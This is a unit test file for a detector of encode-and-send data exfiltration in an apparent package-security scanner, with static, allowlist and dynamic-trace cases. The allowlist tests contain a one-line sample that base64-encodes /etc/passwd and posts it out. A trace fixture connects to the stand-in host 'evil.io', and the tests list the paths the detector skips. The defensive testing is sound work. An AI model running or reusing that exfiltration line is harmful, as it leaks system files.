"""Unit tests for DerivedExfilDetector (Phase 3 T5)."""

from __future__ import annotations

from aigate.models import RiskLevel
from aigate.sandbox.evasion.derived_exfil import DerivedExfilDetector
from aigate.sandbox.types import DynamicTrace, DynamicTraceEvent

# ---------------------------------------------------------------------------
# Fixture helpers
# ---------------------------------------------------------------------------

FIXTURE_DIR = (
    __file__[: __file__.rfind("tests/unit")]
    + "tests/fixtures/evasion/derived_exfil"
)


def _load(filename: str) -> str:
    with open(f"{FIXTURE_DIR}/{filename}") as f:
        return f.read()


def _make_trace(*events: DynamicTraceEvent) -> DynamicTrace:
    return DynamicTrace(ran=True, runtime="test", events=list(events))


def _write_event(target: str) -> DynamicTraceEvent:
    return DynamicTraceEvent(kind="write", ts_ms=0, pid=1, process="python", target=target)


def _connect_event() -> DynamicTraceEvent:
    return DynamicTraceEvent(kind="connect", ts_ms=1, pid=1, process="python", target="evil.io:443")


# ---------------------------------------------------------------------------
# Instantiation
# ---------------------------------------------------------------------------


def test_instantiation() -> None:
    d = DerivedExfilDetector()
    assert d.CATEGORY == "derived_exfil"
    assert d.SEVERITY == RiskLevel.HIGH


# ---------------------------------------------------------------------------
# Static — positive cases
# ---------------------------------------------------------------------------


def test_static_pos1_requests_post_base64() -> None:
    """Detects requests.post + base64.b64encode pattern."""
    d = DerivedExfilDetector()
    content = _load("pos_1.py")
    signals = d.detect_static({"evil.py": content})
    assert len(signals) == 1
    assert signals[0].category == "derived_exfil"
    assert "encode+send" in signals[0].description


def test_static_pos2_fetch_btoa() -> None:
    """Detects fetch() with base64 encoding (JS)."""
    d = DerivedExfilDetector()
    content = _load("pos_2.js")
    signals = d.detect_static({"stealer.js": content})
    assert len(signals) >= 1
    assert any(s.category == "derived_exfil" for s in signals)


def test_static_pos3_urllib_zlib() -> None:
    """Detects urllib.request + zlib.compress pattern."""
    d = DerivedExfilDetector()
    content = _load("pos_3.py")
    signals = d.detect_static({"evil.py": content})
    assert len(signals) == 1
    assert signals[0].severity == RiskLevel.HIGH


def test_static_pos_mutation_whitespace() -> None:
    """Detects pattern even with extra whitespace around function calls."""
    d = DerivedExfilDetector()
    content = _load("pos_mutation_whitespace.py")
    signals = d.detect_static({"evil.py": content})
    assert len(signals) == 1
    assert signals[0].category == "derived_exfil"


def test_static_pos_mutation_hex() -> None:
    """Detects binascii.hexlify variant."""
    d = DerivedExfilDetector()
    content = _load("pos_mutation_hex.py")
    signals = d.detect_static({"evil.py": content})
    assert len(signals) == 1


# ---------------------------------------------------------------------------
# Static — negative cases
# ---------------------------------------------------------------------------


def test_static_neg1_encode_without_send() -> None:
    """No signal when encoding without a network send."""
    d = DerivedExfilDetector()
    content = _load("neg_1.py")
    signals = d.detect_static({"benign.py": content})
    assert signals == []


def test_static_neg2_send_without_encode() -> None:
    """No signal for plain fetch without read-and-encode."""
    d = DerivedExfilDetector()
    content = _load("neg_2.js")
    signals = d.detect_static({"api.js": content})
    assert signals == []


def test_static_neg3_compress_without_network() -> None:
    """No signal for zlib.compress without network call."""
    d = DerivedExfilDetector()
    content = _load("neg_3.py")
    signals = d.detect_static({"compress.py": content})
    assert signals == []


def test_static_neg_real_dist_skipped_by_allowlist() -> None:
    """File under dist/ path is skipped regardless of content."""
    d = DerivedExfilDetector()
    content = _load("neg_real_dist.js")
    # Provide the path with dist/ prefix — WRITE_PATH_ALLOWLIST should skip it
    signals = d.detect_static({"dist/main.js": content})
    assert signals == []


# ---------------------------------------------------------------------------
# Static — allowlist paths
# ---------------------------------------------------------------------------


def test_static_allowlist_node_modules_skipped() -> None:
    """node_modules/ path is skipped."""
    d = DerivedExfilDetector()
    evil_content = "requests.post(url, data=base64.b64encode(open('/etc/passwd').read()))"
    signals = d.detect_static({"node_modules/pkg/index.py": evil_content})
    assert signals == []


def test_static_allowlist_build_dir_skipped() -> None:
    """build/ path is skipped."""
    d = DerivedExfilDetector()
    evil_content = "requests.post(url, data=base64.b64encode(open('/etc/passwd').read()))"
    signals = d.detect_static({"build/bundle.py": evil_content})
    assert signals == []


def test_static_allowlist_wasm_skipped() -> None:
    """.wasm files are skipped."""
    d = DerivedExfilDetector()
    evil_content = "requests.post(url, data=base64.b64encode(open('/etc/passwd').read()))"
    signals = d.detect_static({"module.wasm": evil_content})
    assert signals == []


# ---------------------------------------------------------------------------
# Static — severity
# ---------------------------------------------------------------------------


def test_static_severity_is_high() -> None:
    """All static derived_exfil signals are HIGH severity."""
    d = DerivedExfilDetector()
    content = _load("pos_1.py")
    signals = d.detect_static({"evil.py": content})
    assert all(s.severity == RiskLevel.HIGH for s in signals)


# ---------------------------------------------------------------------------
# Dynamic — positive
# ---------------------------------------------------------------------------


def test_dynamic_tmp_write_plus_connect_returns_category() -> None:
    """Returns category when /tmp write + connect both present."""
    d = DerivedExfilDetector()
    trace = _make_trace(
        _write_event("/tmp/encoded_payload"),
        _connect_event(),
    )
    result = d.detect_dynamic(trace)
    assert result == ["derived_exfil"]


# ---------------------------------------------------------------------------
# Dynamic — negative
# ---------------------------------------------------------------------------


def test_dynamic_tmp_write_without_connect_returns_empty() -> None:
    """No connect → no escalation."""
    d = DerivedExfilDetector()
    trace = _make_trace(_write_event("/tmp/data"))
    assert d.detect_dynamic(trace) == []


def test_dynamic_connect_without_tmp_write_returns_empty() -> None:
    """Connect without /tmp write → no escalation."""
    d = DerivedExfilDetector()
    trace = _make_trace(_connect_event())
    assert d.detect_dynamic(trace) == []


def test_dynamic_non_tmp_write_with_connect_returns_empty() -> None:
    """Write to non-/tmp path + connect → no escalation."""
    d = DerivedExfilDetector()
    trace = _make_trace(
        _write_event("/home/user/output.bin"),
        _connect_event(),
    )
    assert d.detect_dynamic(trace) == []


def test_dynamic_empty_trace_returns_empty() -> None:
    """Empty trace → no escalation."""
    d = DerivedExfilDetector()
    trace = _make_trace()
    assert d.detect_dynamic(trace) == []
